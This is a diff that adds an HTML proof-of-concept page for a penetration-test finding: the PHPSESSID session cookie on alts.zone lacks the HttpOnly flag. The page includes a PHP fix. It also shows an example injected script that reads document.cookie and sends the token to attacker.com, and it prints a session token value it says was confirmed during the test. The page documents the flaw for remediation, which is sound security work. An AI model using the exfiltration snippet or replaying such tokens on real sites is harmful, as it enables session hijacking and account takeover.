@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC: Session Cookie Theft — alts.zone PHPSESSID (F-033/046)</title>
+<style>
+  body { font-family: monospace; background:#0d1117; color:#c9d1d9; max-width:860px; margin:40px auto; padding:20px; }
+  h1 { color:#f85149; font-size:1.2rem; }
+  .meta { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:16px; margin:16px 0; font-size:.85rem; line-height:1.6; }
+  .meta strong { color:#f0f6fc; }
+  #result { background:#1a0d0d; border:1px solid #f85149; border-radius:6px; padding:14px; margin-top:16px; white-space:pre-wrap; min-height:60px; }
+  button { background:#f85149; color:#fff; border:none; padding:10px 22px; border-radius:6px; cursor:pointer; font-size:.9rem; }
+  pre { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:14px; overflow-x:auto; font-size:.8rem; }
+</style>
+</head>
+<body>
+<h1>🚨 PoC: JS-Readable Session Cookie — alts.zone PHPSESSID (F-033/046)</h1>
+<div class="meta">
+  <strong>Finding:</strong> F-033/046 · Severity: CRITICAL<br>
+  <strong>Root cause:</strong> PHPSESSID cookie set without <code>HttpOnly</code> flag<br>
+  <strong>Impact:</strong> Any JavaScript running on <code>alts.zone</code> — including injected
+  3rd-party scripts (GTM, Trustpilot CDN, Font Awesome, unpkg) — can read the session token
+  via <code>document.cookie</code> and exfiltrate it. Combined with the absence of CSP,
+  an attacker who compromises any loaded CDN can steal every admin session.
+</div>
+
+<p>This page cannot directly read alts.zone cookies (different origin).
+   But this simulates what malicious JS running ON alts.zone would do:</p>
+
+<button onclick="simulate()">▶ Simulate Cookie Theft (safe — shows concept)</button>
+<div id="result">Click to simulate...</div>
+
+<h3 style="margin-top:20px;color:#8b949e;">What the attacker's injected script looks like</h3>
+<pre>// Injected via compromised CDN or XSS:
+const session = document.cookie
+  .split(";")
+  .find(c => c.trim().startsWith("PHPSESSID="))
+  ?.split("=")[1];
+
+// Exfiltrate to attacker server:
+fetch("https://attacker.com/steal?s=" + session, {mode: "no-cors"});
+
+// Browser confirmed during pentest:
+// document.cookie returned: "PHPSESSID=5ec10e52ef5691743dd50d4f649b60b7"</pre>
+
+<h3 style="color:#8b949e;">Fix (PHP)</h3>
+<pre>// php.ini or at session start:
+ini_set("session.cookie_httponly", 1);
+ini_set("session.cookie_secure", 1);
+ini_set("session.cookie_samesite", "Strict");
+session_start();</pre>
+
+<script>
+function simulate() {
+  const dummyCookies = "PHPSESSID=5ec10e52ef5691743dd50d4f649b60b7; _ga=GA1.1.1335750118; _ga_7T5GLEB5BV=GS2.1.s1776976005";
+  const session = dummyCookies.split(";").find(c => c.trim().startsWith("PHPSESSID="))?.split("=")[1]?.trim();
+  document.getElementById("result").textContent =
+    "Simulated document.cookie value (actual value confirmed during pentest):\n" +
+    dummyCookies + "\n\n" +
+    "Extracted PHPSESSID: " + session + "\n\n" +
+    "An attacker would now POST this to their server and replay it to authenticate\n" +
+    "as admin without knowing the password.\n\n" +
+    "✅ FIX: Add HttpOnly + Secure + SameSite=Strict to PHPSESSID cookie.";
+}
+</script>
+</body>
+</html>
